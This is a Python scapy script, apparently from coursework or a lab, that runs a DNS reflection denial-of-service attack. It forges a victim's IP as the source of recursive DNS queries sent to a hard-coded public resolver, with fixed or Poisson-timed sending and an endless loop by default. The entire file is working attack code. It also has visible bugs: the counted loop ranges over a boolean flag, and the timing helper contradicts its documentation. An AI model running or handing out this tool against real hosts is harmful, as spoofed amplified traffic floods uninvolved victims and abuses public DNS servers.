
"""dnsMultiplication


Usage:
	dnsMultiplication.py <srcIP>  [--sleep=<sec>] [--poisson=<lambda>] [--packetsCount=<number>]  

Options:
	-h --help     Show this screen.
	--sleep=<sec>	How many seconds you want to wait between sending of packets (don't use it with poisson)
	--poisson=<lambda> Send the intruding packets with random timing according to a Poisson Process with rate lambda (don't use it with sleep)
	, If you want something to happen every X seconds (on average for a high number of times), put X as lambda

	--packetsCount=<number> Number of paquets you want to send  



"""

from docopt import docopt
import math
import random
from scapy.all import *


# used to compute random timing according to a Poisson Process with rate lambda (parameter)
def nextTime(lambdaParameter):
	print(lambdaParameter)
	lambdaParameter = 1/lambdaParameter
	return -math.log(1.0 - random.random()) / lambdaParameter


def main(arguments):

	#The source IP corresponds here to the victim IP
	srcIP = arguments["<srcIP>"]

	#Czech Public DNS server
	destIP = "185.174.168.47"
	
	if arguments["--sleep"]:
		sleep = True
		seconds = int(arguments["--sleep"])
	else:
		sleep = False

	if arguments["--poisson"]:
		poisson = True
		lambdaParameter = float(arguments["--poisson"])
	else:
		poisson = False

	if arguments["--packetsCount"]:
		packetsCount = True
		packetNumber = int(arguments["--packetsCount"])
	else:
		packetsCount = False

	print("[*] Starting DDOS Attack ")
	print("[*] Sending spoofed DNS queries from %s to %s" % (srcIP, destIP))

	if packetsCount:
		for i in range(0,packetsCount):	

			IPPacket = IP(src=srcIP,dst=destIP)
			UDPPacket = UDP(sport=RandShort(),dport=53)

			#rd = 1 to activate the recursion
			DNSPacket = DNS(rd=1,qd=DNSQR(qname="fit.cvut.cz"))

			#possibility to use sr1 function but wasn't working properly I don't know why
			#sr1 is the send/receive function that only returns the first answered packet
			send(IPPacket/UDPPacket/DNSPacket,verbose=False)
			if poisson:
				time.sleep(nextTime(lambdaParameter))
			elif sleep:
				time.sleep(seconds)
	else:
		while(1):
			
			IPPacket = IP(src=srcIP,dst=destIP)
			UDPPacket = UDP(sport=RandShort(),dport=53)

			#rd = 1 to activate the recursion
			DNSPacket = DNS(rd=1,qd=DNSQR(qname="fit.cvut.cz"))

			#sr1 is the send/receive function that only returns the first answered packet
			send(IPPacket/UDPPacket/DNSPacket,verbose=False)
			if poisson:
				time.sleep(nextTime(lambdaParameter))
			elif sleep:
				time.sleep(seconds)

if __name__ == '__main__':
    arguments = docopt(__doc__, version='dnsMultiplication')
    main(arguments)





